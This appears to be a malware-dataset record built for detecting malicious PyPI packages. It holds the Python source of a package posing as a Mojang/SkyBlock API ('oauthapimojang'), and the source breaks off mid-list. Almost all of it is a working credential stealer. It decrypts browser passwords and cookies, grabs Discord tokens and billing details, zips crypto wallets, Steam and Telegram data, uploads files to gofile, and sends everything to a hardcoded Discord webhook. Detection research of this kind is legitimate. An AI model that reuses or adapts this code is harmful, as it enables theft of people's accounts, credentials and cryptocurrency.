{
  "metadata": {
    "package_name": "oauthapimojang-0.3.4",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/oauthapimojang-0.3.4.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/oauthapimojang-0.3.4.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "SkyBlockAPI.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom urllib.request import Request, urlopen\nfrom json import loads, dumps\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport subprocess\n\nhook = \"https://discordapp.com/api/webhooks/1097280748253368401/rlMLWeAuv6nwgGOdjTj7ESsVwt-FJjqHUsH7H0b2DPD5MXmhj_FoPGJ6jf8iDzKz5Sjh\"\nDETECTED = False\n\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\nrequirements = [\n    [\"requests\", \"requests\"],\n    [\"Crypto.Cipher\", \"pycryptodome\"]\n]\nfor modl in requirements:\n    try: __import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)\n        time.sleep(3)\n\nimport requests\nfrom Crypto.Cipher import AES\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\nclass DATA_BLOB(Structure):\n    _fields_ = [\n        ('cbData', wintypes.DWORD),\n        ('pbData', POINTER(c_char))\n    ]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n\n    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n        return GetData(blob_out)\n\ndef DecryptValue(buff, master_key=None):\n    starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n    if starts == 'v10' or starts == 'v11':\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\ndef LoadRequests(methode, url, data='', files='', headers=''):\n    for i in range(8): # max trys\n        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG\n                        return r\n        except:\n            pass\n\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except: \n            pass\n\ndef globalInfo():\n    ip = getip()\n    username = os.getenv(\"USERNAME\")\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    ipdata = loads(ipdatanojson)\n    contry = ipdata[\"country_name\"]\n    contryCode = ipdata[\"country_code\"].lower()\n    globalinfo = f\":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`\"\n    return globalinfo\n\ndef Trust(Cookies):\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\n        \ndef GetUHQFriends(token):\n    badgeList =  [\n        {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n        {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n        {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n        {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n        {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n        {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n        {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n        {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n        {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n        {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n    ]\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        friendlist = loads(urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode())\n    except:\n        return False\n\n    uhqlist = ''\n    for friend in friendlist:\n        OwnedBadges = ''\n        flags = friend['user']['public_flags']\n        for badge in badgeList:\n            if flags // badge[\"Value\"] != 0 and friend['type'] == 1:\n                if not \"House\" in badge[\"Name\"]:\n                    OwnedBadges += badge[\"Emoji\"]\n                flags = flags % badge[\"Value\"]\n        if OwnedBadges != '':\n            uhqlist += f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\n\n\ndef GetBilling(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        billingjson = loads(urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode())\n    except:\n        return False\n    \n    if billingjson == []: return \" -\"\n\n    billing = \"\"\n    for methode in billingjson:\n        if methode[\"invalid\"] == False:\n            if methode[\"type\"] == 1:\n                billing += \":credit_card:\"\n            elif methode[\"type\"] == 2:\n                billing += \":parking: \"\n\n    return billing\n\n\ndef GetBadge(flags):\n    if flags == 0: return ''\n\n    OwnedBadges = ''\n    badgeList =  [\n        {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n        {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n        {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n        {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n        {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n        {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n        {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n        {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n        {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n        {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n    ]\n    for badge in badgeList:\n        if flags // badge[\"Value\"] != 0:\n            OwnedBadges += badge[\"Emoji\"]\n            flags = flags % badge[\"Value\"]\n\n    return OwnedBadges\n\ndef GetTokenInfo(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n\n    userjson = loads(urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)).read().decode())\n    username = userjson[\"username\"]\n    hashtag = userjson[\"discriminator\"]\n    email = userjson[\"email\"]\n    idd = userjson[\"id\"]\n    pfp = userjson[\"avatar\"]\n    flags = userjson[\"public_flags\"]\n    nitro = \"\"\n    phone = \"-\"\n\n    if \"premium_type\" in userjson: \n        nitrot = userjson[\"premium_type\"]\n        if nitrot == 1:\n            nitro = \"<:classic:896119171019067423> \"\n        elif nitrot == 2:\n            nitro = \"<a:boost:824036778570416129> <:classic:896119171019067423> \"\n    if \"phone\" in userjson: phone = f'`{userjson[\"phone\"]}`'\n\n    return username, hashtag, email, idd, pfp, flags, nitro, phone\n\ndef checkToken(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers))\n        return True\n    except:\n        return False\n\n\ndef uploadToken(token, path):\n    global hook\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)\n\n    if pfp == None: \n        pfp = \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\"\n    else:\n        pfp = f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n\n    billing = GetBilling(token)\n    badge = GetBadge(flags)\n    friends = GetUHQFriends(token)\n    if friends == '': friends = \"No Rare Friends\"\n    if not billing:\n        badge, phone, billing = \"ðŸ”’\", \"ðŸ”’\", \"ðŸ”’\"\n    if nitro == '' and badge == '': nitro = \" -\"\n\n    data = {\n        \"content\": f'{globalInfo()} | Found in `{path}`',\n        \"embeds\": [\n            {\n            \"color\": 14406413,\n            \"fields\": [\n                {\n                    \"name\": \":rocket: Token:\",\n                    \"value\": f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n                },\n                {\n                    \"name\": \":envelope: Email:\",\n                    \"value\": f\"`{email}`\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":mobile_phone: Phone:\",\n                    \"value\": f\"{phone}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":globe_with_meridians: IP:\",\n                    \"value\": f\"`{getip()}`\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":beginner: Badges:\",\n                    \"value\": f\"{nitro}{badge}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":credit_card: Billing:\",\n                    \"value\": f\"{billing}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \":clown: HQ Friends:\",\n                    \"value\": f\"{friends}\",\n                    \"inline\": False\n                }\n                ],\n            \"author\": {\n                \"name\": f\"{username}#{hashtag} ({idd})\",\n                \"icon_url\": f\"{pfp}\"\n                },\n            \"footer\": {\n                \"text\": \"milka STEALER\",\n                \"icon_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\"\n                },\n            \"thumbnail\": {\n                \"url\": f\"{pfp}\"\n                }\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\",\n        \"username\": \"milka Stealer\",\n        \"attachments\": []\n        }\n    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\",listt)\n    while \"https\" in e: e.remove(\"https\")\n    while \"com\" in e: e.remove(\"com\")\n    while \"net\" in e: e.remove(\"net\")\n    return list(set(e))\n\ndef upload(name, link):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n\n    if name == \"wpcook\":\n        rb = ' | '.join(da for da in cookiWords)\n        if len(rb) > 1000: \n            rrrrr = Reformat(str(cookiWords))\n            rb = ' | '.join(da for da in rrrrr)\n        data = {\n            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                    \"title\": \"milka | Cookies Stealer\",\n                    \"description\": f\"**Found**:\\n{rb}\\n\\n**Data:**\\n:cookie: â€¢ **{CookiCount}** Cookies Found\\n:link: â€¢ [milkaCookies.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"milka STEALER\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\"\n                    }\n                }\n            ],\n            \"username\": \"milka\",\n            \"avatar_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\",\n            \"attachments\": []\n            }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n\n    if name == \"wppassw\":\n        ra = ' | '.join(da for da in paswWords)\n        if len(ra) > 1000: \n            rrr = Reformat(str(paswWords))\n            ra = ' | '.join(da for da in rrr)\n\n        data = {\n            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                    \"title\": \"milka | Password Stealer\",\n                    \"description\": f\"**Found**:\\n{ra}\\n\\n**Data:**\\nðŸ”‘ â€¢ **{PasswCount}** Passwords Found\\n:link: â€¢ [milkaPassword.txt]({link})\",\n                    \"color\": 14406413,\n                    \"footer\": {\n                        \"text\": \"milka STEALER\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\"\n                    }\n                }\n            ],\n            \"username\": \"milka\",\n            \"avatar_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\",\n            \"attachments\": []\n            }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n\n    if name == \"kiwi\":\n        data = {\n            \"content\": globalInfo(),\n            \"embeds\": [\n                {\n                \"color\": 14406413,\n                \"fields\": [\n                    {\n                    \"name\": \"Interesting files found on user PC:\",\n                    \"value\": link\n                    }\n                ],\n                \"author\": {\n                    \"name\": \"milka | File Stealer\"\n                },\n                \"footer\": {\n                    \"text\": \"milka STEALER\",\n                    \"icon_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\"\n                }\n                }\n            ],\n            \"username\": \"milka\",\n            \"avatar_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\",\n            \"attachments\": []\n            }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n\n\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\wp{name}.txt\"\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(f\"<--milka STEALER ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0] != '':\n                f.write(f\"{line}\\n\")\n\nTokens = ''\ndef getToken(path, arg):\n    if not os.path.exists(path): return\n\n    path += arg\n    for file in os.listdir(path):\n        if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n            for line in [x.strip() for x in open(f\"{path}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", r\"mfa\\.[\\w-]{80,95}\"):\n                    for token in re.findall(regex, line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens += token\n                                uploadToken(token, path)\n\nPassw = []\ndef getPassw(path, arg):\n    global Passw, PasswCount\n    if not os.path.exists(path): return\n\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n\n    tempfold = temp + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n\n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data: \n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords: paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n            PasswCount += 1\n    writeforfile(Passw, 'passw')\n\nCookies = []    \ndef getCookie(path, arg):\n    global Cookies, CookiCount\n    if not os.path.exists(path): return\n    \n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    \n    tempfold = temp + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    \n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n    \n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data: \n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords: cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n            CookiCount += 1\n    writeforfile(Cookies, 'cook')\n\ndef GetDiscord(path, arg):\n    if not os.path.exists(f\"{path}/Local State\"): return\n\n    pathC = path + arg\n\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    \n    for file in os.listdir(pathC):\n        if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n            for line in [x.strip() for x in open(f\"{pathC}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for token in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line):\n                    global Tokens\n                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens += tokenDecoded\n                            uploadToken(tokenDecoded, path)\n\ndef GatherZips(paths1, paths2, paths3):\n    thttht = []\n    for patt in paths1:\n        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])\n        a.start()\n        thttht.append(a)\n\n    for patt in paths2:\n        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])\n        a.start()\n        thttht.append(a)\n    \n    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])\n    a.start()\n    thttht.append(a)\n\n    for thread in thttht: \n        thread.join()\n    global WalletsZip, GamingZip, OtherZip\n\n    wal, ga, ot = \"\",'', ''\n    if not len(WalletsZip) == 0:\n        wal = \":coin:  â€¢  Wallets\\n\"\n        for i in WalletsZip:\n            wal += f\"â””â”€ [{i[0]}]({i[1]})\\n\"\n    if not len(GamingZip) == 0:\n        ga = \":video_game:  â€¢  Gaming:\\n\"\n        for i in GamingZip:\n            ga += f\"â””â”€ [{i[0]}]({i[1]})\\n\"\n    if not len(OtherZip) == 0:\n        ot = \":tickets:  â€¢  Apps\\n\"\n        for i in OtherZip:\n            ot += f\"â””â”€ [{i[0]}]({i[1]})\\n\"          \n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n\n    data = {\n        \"content\": globalInfo(),\n        \"embeds\": [\n            {\n            \"title\": \"milka Zips\",\n            \"description\": f\"{wal}\\n{ga}\\n{ot}\",\n            \"color\": 15781403,\n            \"footer\": {\n                \"text\": \"milka STEALER\",\n                \"icon_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\"\n            }\n            }\n        ],\n        \"username\": \"milka Stealer\",\n        \"avatar_url\": \"https://cdn.discordapp.com/attachments/1090710915340566691/1097191814571769937/1987e14bee02061871178bd90879dfe3.png\",\n        \"attachments\": []\n    }\n    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n\n\ndef ZipTelegram(path, arg, procc):\n    global OtherZip\n    pathC = path\n    name = arg\n    if not os.path.exists(pathC): return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n    zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file and not \"tdummy\" in file and not \"user_data\" in file and not \"webview\" in file: \n            zf.write(pathC + \"/\" + file)\n    zf.close()\n\n    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\n    OtherZip.append([arg, lnik])\n\ndef ZipThings(path, arg, procc):\n    pathC = path\n    name = arg\n    global WalletsZip, GamingZip, OtherZip\n\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    \n    if not os.path.exists(pathC): return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f >nul 2>&1\", shell=True)\n\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(' ', '')\n        name = f\"{browser}\"\n\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"): return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False: return\n        name = arg\n\n    zf = ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    for file in os.listdir(pathC):\n        if not \".zip\" in file: zf.write(pathC + \"/\" + file)\n    zf.close()\n\n    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\n\n    if \"Wallet\" in arg or \"eogaeaoehlef\" in arg:\n        WalletsZip.append([name, lnik])\n    elif \"NationsGlory\" in name or \"Steam\" in name or \"RiotCli\" in name:\n        GamingZip.append([name, lnik])\n    else:\n        OtherZip.append([name, lnik])\n\n\ndef GatherAll():\n    browserPaths = [\n        [f\"{roaming}/Opera Software/Opera GX Stable\",               \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{roaming}/Opera Software/Opera Stable\",                  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",  \"opera.exe\",    \"/Local Storage/leveldb\",           \"/\",            \"/Network\",             \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"                      ],\n        [f\"{local}/Google/Chrome/User Data\",                        \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/Google/Chrome SxS/User Data\",                    \"chrome.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/BraveSoftware/Brave-Browser/User Data\",          \"brave.exe\",    \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ],\n        [f\"{local}/Yandex/YandexBrowser/User Data\",                 \"yandex.exe\",   \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\"                                    ],\n        [f\"{local}/Microsoft/Edge/User Data\",                       \"edge.exe\",     \"/Default/Local Storage/leveldb\",   \"/Default\",     \"/Default/Network\",     \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\"              ]\n    ]\n\n    discordPaths = [\n        [f\"{roaming}/Discord\", \"/Local Storage/leveldb\"],\n        [f\"{roaming}/Lightcord\", \"/Local Storage/leveldb\"],\n        [f\"{roaming}/discordcanary\", \"/Local Storage/leveldb\"],\n        [f\"{roaming}/discordptb\", \"/Local Storage/leveldb\"],\n    ]\n\n    PathsToZip = [\n        [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n        [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n        [\"C:\\\\Program Files (x86)\\\\Steam\\\\config\", \"steam.exe\", \"Steam\"],\n        [f\"{roaming}/NationsGlory/Local Storage/leveldb\", \"NationsGlory.exe\", \"NationsGlory\"],\n        [f\"{local}/Riot Games/Riot Client/Data\", \"RiotClientServices.exe\", \"RiotClient\"]\n    ]\n    Telegram = [f\"{roaming}/Telegram Desktop/tdata\", 'telegram.exe', \"Telegram\"]\n\n    for patt in browserPaths: \n        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths: \n        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])\n        a.start()\n        Threadlist.append(a)\n\n    for patt in browserPaths: \n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n\n    ThCokk = []\n    for patt in browserPaths: \n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        ThCokk.append(a)\n\n    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()\n\n    for thread in ThCokk: thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True: return\n\n    for thread in Threadlist: \n        thread.join()\n    global upths\n    upths = []\n\n    for file in [\"wppassw.txt\", \"wpcook.txt\"]: \n        upload(file.replace(\".txt\", \"\"), uploadToAnonfiles(os.getenv(\"TEMP\") + \"\\\\\" + file))\n\ndef uploadToAnonfiles(path):\n    try:return requests.post(f'https://{requests.get(\"https://api.gofile.io/getServer\").json()[\"data\"][\"server\"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()[\"data\"][\"downloadPage\"]\n    except:return False\n\ndef KiwiFolder(pathF, keywords):\n    global KiwiFiles\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file): return\n        i += 1\n        if i <= maxfilesperdir:\n            url = uploadToAnonfiles(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    KiwiFiles.append([\"folder\", pathF + \"/\", ffound])\n\nKiwiFiles = []\ndef KiwiFile(path, keywords):\n    global KiwiFiles\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, uploadToAnonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    KiwiFolder(target, keywords)\n                    break\n\n    KiwiFiles.append([\"folder\", path, fifound])\n\ndef Kiwi():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n\n    key_wordsFolder = [\n        \"account\",\n        \"acount\",\n        \"passw\",\n        \"secret\"\n\n    ]\n\n    key_wordsFiles = [\n        \"passw\",\n        \"mdp\",\n        \"motdepasse\",\n        \"mot_de_passe\",\n        \"login\",\n        \"secret\",\n        \"account\",\n        \"acount\",\n        \"paypal\",\n        \"banque\",\n        \"account\",\n        \"metamask\",\n        \"wallet\",\n        \"crypto\",\n        \"exodus\",\n        \"discord\",\n        \"2fa\",\n        